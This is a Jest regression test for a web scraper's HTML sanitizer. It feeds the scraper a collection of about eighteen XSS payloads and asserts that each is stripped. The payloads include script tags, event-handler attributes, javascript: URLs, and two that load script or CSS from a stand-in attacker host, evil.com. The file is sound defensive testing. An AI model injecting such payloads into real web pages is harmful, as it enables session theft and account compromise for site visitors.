// Regression Lock: QA adversarial 2026-05-07
// Class: 9 (End-to-end property) | Severity: HIGH
// Finding: HIGH10 — incomplete XSS vector coverage in sanitization tests
// Spec: spec-12-scrapeimsbc-imsbc-source-url
// DO NOT DELETE — see references/regression_lock_workflow.md

import { scrapeImsbc } from '@/lib/knowledge/sources/imsbc/scraper';

global.fetch = jest.fn();

describe('regression spec12-HIGH10: XSS vector completeness', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('comprehensive XSS payloads must all be sanitized', async () => {
    const tocHtml = `<a href="xss.html">XSS Test</a>`;

    // Comprehensive XSS payload collection
    const xssPayloads = [
      '<SCRIPT>alert(1)</SCRIPT>',  // Uppercase
      '<ScRiPt>alert(1)</ScRiPt>',  // Mixed case
      '<script src="http://evil.com/xss.js"></script>',  // External script
      '<svg onload=alert(1)>',  // SVG event handler
      '<img src=x onerror=alert(1)>',  // img onerror
      '<body onload=alert(1)>',  // body onload
      '<iframe src=javascript:alert(1)>',  // iframe javascript:
      '<object data="javascript:alert(1)">',  // object tag
      '<embed src="javascript:alert(1)">',  // embed tag
      '<math><mtext></mtext><script>alert(1)</script></math>',  // MathML
      '<form action="javascript:alert(1)"><input type="submit"></form>',  // form action
      '<input onfocus=alert(1) autofocus>',  // input autofocus
      '<select onfocus=alert(1) autofocus>',  // select autofocus
      '<textarea onfocus=alert(1) autofocus>',  // textarea autofocus
      '<marquee onstart=alert(1)>',  // marquee (deprecated but dangerous)
      '<details open ontoggle=alert(1)>',  // details toggle
      '<style>@import "http://evil.com/xss.css";</style>',  // CSS import
      '<<SCRIPT>alert(1);//<</SCRIPT>',  // Nested angle brackets
    ];

    const sectionHtml = `
      <h1>XSS Test Section</h1>
      ${xssPayloads.join('\n')}
      <p>End of XSS tests</p>
    `;

    (global.fetch as jest.Mock)
      .mockResolvedValueOnce({
        ok: true,
        status: 200,
        text: async () => tocHtml,
      })
      .mockResolvedValue({
        ok: true,
        status: 200,
        text: async () => sectionHtml,
      });

    const result = await scrapeImsbc('https://example.com/imsbc');

    expect(result).toHaveLength(1);
    const html = result[0].rawHtml.toLowerCase();

    // Assert ALL XSS vectors are neutralized
    expect(html).not.toContain('<script');
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('onload');
    expect(html).not.toContain('onfocus');
    expect(html).not.toContain('onstart');
    expect(html).not.toContain('ontoggle');
    expect(html).not.toContain('<svg');
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<object');
    expect(html).not.toContain('<embed');
    expect(html).not.toContain('<math');
    expect(html).not.toContain('<marquee');
    expect(html).not.toContain('@import');
    expect(html).not.toContain('alert(');

    // NOTE: This test ensures sanitization is comprehensive, not just token checks
  });
});
